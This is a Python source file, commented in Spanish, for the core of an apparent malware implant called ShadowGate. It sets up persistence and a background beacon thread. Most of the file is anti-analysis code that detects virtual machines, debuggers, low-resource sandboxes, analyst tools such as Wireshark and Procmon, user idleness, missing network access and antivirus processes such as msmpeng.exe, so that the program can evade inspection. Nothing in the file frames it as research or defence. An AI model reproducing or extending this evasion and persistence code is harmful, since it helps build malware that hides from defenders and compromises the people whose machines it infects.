#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
import psutil
import ctypes
import socket  # añadido para check_network_environment

# Cambiar importaciones problemáticas
try:
    from modules.utilities import log_action, get_system_info, secure_delete
    from modules.persistence import establish_persistence
    from modules.encryption import SecureComs
    from modules.communication import send_beacon
except ImportError:
    # Fallback para importaciones directas
    from Objetivo.utilities import log_action, get_system_info, secure_delete
    # Crear persistence.py básico si no existe
    try:
        from persistence import establish_persistence
    except ImportError:
        def establish_persistence():
            return True
    from Objetivo.encryption import SecureComs
    # Crear communication.py básico si no existe
    try:
        from communication import send_beacon
    except ImportError:
        def send_beacon(*args):
            while True:
                import time
                time.sleep(60)


class ShadowGateCore:
    def __init__(self, config):
        self.config = config
        self.coms = SecureComs()
        self.running = False

    def initialize(self):
        """Inicializar el sistema principal"""
        log_action("Initializing ShadowGate Core", level="INFO")

        # Verificación de entorno
        if self.anti_analysis():
            log_action("Sandbox detected, proceeding with caution", level="WARN")

        # Establecer persistencia
        try:
            establish_persistence()
        except Exception as e:
            log_action("Persistence setup failed", details=str(e), level="WARN")

        # Iniciar beacon en segundo plano
        try:
            threading.Thread(target=send_beacon, args=(self.coms,), daemon=True).start()
        except Exception as e:
            log_action("Beacon thread failed", details=str(e), level="WARN")

        self.running = True
        log_action("ShadowGate Core initialized successfully", level="INFO")

    def anti_analysis(self):
        """Detección de entornos de análisis"""
        sandbox_checks = {
            "VM Check": self.check_vm(),
            "Debugger Check": self.check_debugger(),
            "Resource Check": self.check_resources(),
            "Process Check": self.check_blacklisted_processes(),
            "User Check": self.check_user_activity(),
            "Network Check": self.check_network_environment(),
            "AV Check": self.check_antivirus()
        }

        if any(sandbox_checks.values()):
            log_action("Sandbox detected, activating evasion techniques", level="WARN")
            return True
        return False

    def check_vm(self):
        # Implementación de detección de máquina virtual
        vm_indicators = ["vmware", "virtualbox", "qemu", "vbox", "xen", "hyperv"]

        try:
            import wmi
            c = wmi.WMI()
            for item in c.Win32_ComputerSystem():
                if any(vm in item.Model.lower() for vm in vm_indicators):
                    return True
        except ImportError:
            return False
        except Exception:
            return False

        return False

    def check_debugger(self):
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent()
        except Exception:
            return False

    def check_resources(self):
        try:
            # Sistemas virtuales suelen tener recursos limitados
            if (psutil.cpu_count() < 2 or
                    psutil.virtual_memory().total < 2 * 1024 ** 3 or
                    psutil.disk_usage('C:\\').total < 20 * 1024 ** 3):
                return True
        except Exception:
            return False
        return False

    def check_blacklisted_processes(self):
        blacklist = ["wireshark", "procmon", "fiddler", "httpdebugger", "ollydbg"]
        try:
            for proc in psutil.process_iter(['name']):
                if any(bl in proc.info['name'].lower() for bl in blacklist):
                    return True
        except Exception:
            return False
        return False

    def check_user_activity(self):
        try:
            # Estructura para GetLastInputInfo
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))

            uptime = ctypes.windll.kernel32.GetTickCount()
            idle_time = (uptime - lii.dwTime) / 1000

            return idle_time > 300  # 5 minutos sin actividad
        except Exception:
            return False

    def check_network_environment(self):
        try:
            socket.gethostbyname('microsoft.com')
            return False
        except Exception:
            return True

    def check_antivirus(self):
        av_processes = ["avguard.exe", "avgnt.exe", "avp.exe", "msmpeng.exe"]
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in av_processes:
                    return True
        except Exception:
            return False
        return False

    def shutdown(self):
        """Apagar el sistema de forma segura"""
        log_action("Shutting down ShadowGate Core", level="INFO")
        self.running = False
